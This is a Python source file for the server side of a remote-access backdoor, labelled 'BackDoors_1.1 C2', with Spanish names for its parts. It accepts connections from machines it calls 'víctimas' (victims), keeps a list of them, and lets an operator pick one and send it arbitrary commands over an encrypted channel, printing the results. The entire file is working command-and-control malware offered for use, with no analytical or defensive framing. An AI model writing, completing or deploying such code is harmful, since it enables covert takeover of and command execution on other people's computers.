# server/main.py

import socket
import threading

from core.config import C2_HOST, C2_PORT
from core.comms import setup_socket_server, recv_encrypted, send_encrypted

victimas = {}
victimas_lock = threading.Lock()

def handler_cliente(sock, addr, vid):
    try:
        print(f"[+] Víctima {vid} conectada desde {addr}")
        while True:
            comando = input(f"[{vid}@{addr}] > ")
            if comando.strip() == "":
                continue
            send_encrypted(sock, comando.encode())
            data = recv_encrypted(sock)
            if data:
                print(f"< {data.decode(errors='ignore')}")
            if comando.strip() == "exit":
                break
    except Exception as e:
        print(f"[!] Error con víctima {vid}: {e}")
    finally:
        with victimas_lock:
            if vid in victimas:
                del victimas[vid]
        sock.close()
        print(f"[!] Víctima {vid} desconectada.")

def aceptar_victimas(srv_sock):
    vid = 1
    while True:
        sock, addr = srv_sock.accept()
        with victimas_lock:
            victimas[vid] = (sock, addr)
            threading.Thread(target=handler_cliente, args=(sock, addr, vid), daemon=True).start()
            vid += 1

def listar_victimas():
    with victimas_lock:
        for vid, (sock, addr) in victimas.items():
            print(f"{vid}: {addr}")

def main():
    print(f"[*] BackDoors_1.1 C2 escuchando en {C2_HOST}:{C2_PORT}")
    srv_sock = setup_socket_server(C2_HOST, C2_PORT)
    threading.Thread(target=aceptar_victimas, args=(srv_sock,), daemon=True).start()
    while True:
        cmd = input("C2 > ").strip()
        if cmd == "list":
            listar_victimas()
        elif cmd.startswith("connect "):
            vid = int(cmd.split()[1])
            with victimas_lock:
                if vid in victimas:
                    sock, addr = victimas[vid]
                    handler_cliente(sock, addr, vid)
                else:
                    print("[!] ID inválido.")
        elif cmd == "exit":
            print("[*] Cerrando C2...")
            break
        else:
            print("Comandos: list | connect <id> | exit")

if __name__ == "__main__":
    main()
